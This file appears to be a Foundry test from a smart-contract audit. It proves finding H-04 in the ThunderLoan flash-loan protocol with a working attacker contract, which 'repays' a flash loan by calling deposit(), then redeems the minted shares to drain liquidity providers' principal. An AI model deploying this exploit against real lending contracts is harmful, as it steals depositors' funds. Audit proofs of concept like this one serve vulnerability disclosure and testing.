// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {ThunderLoan} from "./vendor/protocol/ThunderLoan.sol";
import {AssetToken} from "./vendor/protocol/AssetToken.sol";
import {MockPoolFactory} from "./vendor/mocks/MockPoolFactory.sol";
import {MockToken} from "./mocks/MockToken.sol";
import {IFlashLoanReceiver} from "./vendor/interfaces/IFlashLoanReceiver.sol";

/// @notice H-04: flashloan repayment is validated by a balance check
///         (`endingBalance >= startingBalance + fee`), not by an accounting
///         check (did repay() get called?). deposit() increases assetToken's
///         balance, so calling deposit() inside executeOperation satisfies
///         the check AND mints shares to the attacker. Attacker redeems
///         shares → walks with the borrowed amount. Every LP loses principal.
contract DepositRepayAttacker is IFlashLoanReceiver {
    address public immutable tl;
    IERC20 public immutable token;

    constructor(address _tl, address _token) {
        tl = _tl;
        token = IERC20(_token);
    }

    function executeOperation(address tokenAddr, uint256 amount, uint256 fee, address, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == tl, "not thunderLoan");
        require(tokenAddr == address(token), "wrong token");

        // "Repay" by calling deposit() instead of repay(). deposit() transfers
        // tokens to assetToken — satisfying flashloan's balance check — AND
        // mints AssetToken shares to us, which we redeem after the flashloan.
        token.approve(tl, amount + fee);
        ThunderLoan(tl).deposit(token, amount + fee);
        return true;
    }

    function redeemAndSendTo(address recipient) external {
        uint256 shares = AssetToken(ThunderLoan(tl).getAssetFromToken(token)).balanceOf(address(this));
        ThunderLoan(tl).redeem(token, shares);
        token.transfer(recipient, token.balanceOf(address(this)));
    }
}

contract H04FlashLoanRepaidViaDeposit is Test {
    ThunderLoan internal tl;
    AssetToken internal assetToken;
    MockToken internal token;
    MockPoolFactory internal factory;

    address internal lp = makeAddr("lp");

    function setUp() public {
        factory = new MockPoolFactory();
        token = new MockToken();

        ThunderLoan impl = new ThunderLoan();
        ERC1967Proxy proxy =
            new ERC1967Proxy(address(impl), abi.encodeWithSignature("initialize(address)", address(factory)));
        tl = ThunderLoan(address(proxy));

        factory.createPool(address(token));
        assetToken = tl.setAllowedToken(token, true);
    }

    function test_FlashLoanRepaidViaDepositDrainsLP() public {
        // ── Setup: LP seeds the pool with 10,000 tokens ───────────────────
        token.mint(lp, 10_000 ether);
        vm.prank(lp);
        token.approve(address(tl), type(uint256).max);
        vm.prank(lp);
        tl.deposit(token, 10_000 ether);

        uint256 poolBefore = token.balanceOf(address(assetToken));
        assertEq(poolBefore, 10_000 ether, "LP principal is in the pool");

        // ── Attacker: funded only with the fee, gets `amount` via the loan ─
        uint256 amount = 1_000 ether;
        uint256 fee = tl.getCalculatedFee(token, amount);
        assertGt(fee, 0, "fee > 0");
        assertLt(fee, amount / 100, "fee is a small fraction of the loan");

        DepositRepayAttacker attacker = new DepositRepayAttacker(address(tl), address(token));
        token.mint(address(attacker), fee); // attacker's only capital

        // ── Attack: flashloan → deposit inside callback → redeem after ────
        tl.flashloan(address(attacker), token, amount, "");
        attacker.redeemAndSendTo(address(this));

        // ── Assertions ────────────────────────────────────────────────────
        uint256 poolAfter = token.balanceOf(address(assetToken));
        uint256 attackerProceeds = token.balanceOf(address(this));
        uint256 lpClaim =
            (assetToken.balanceOf(lp) * assetToken.getExchangeRate()) / assetToken.EXCHANGE_RATE_PRECISION();

        // The attacker walked with ~the loan amount (minus rounding)
        assertGt(attackerProceeds, amount - 1 ether, "attacker captured the loan");
        // The LP's principal was drained
        assertLt(poolAfter, poolBefore, "LP principal drained");
        assertLt(poolAfter, poolAfter + attackerProceeds - fee, "profit sourced from pool");
        // The pool is insolvent — LP's claim exceeds what's actually held
        assertLt(poolAfter, lpClaim, "pool insolvent; LP cannot be made whole");
    }
}
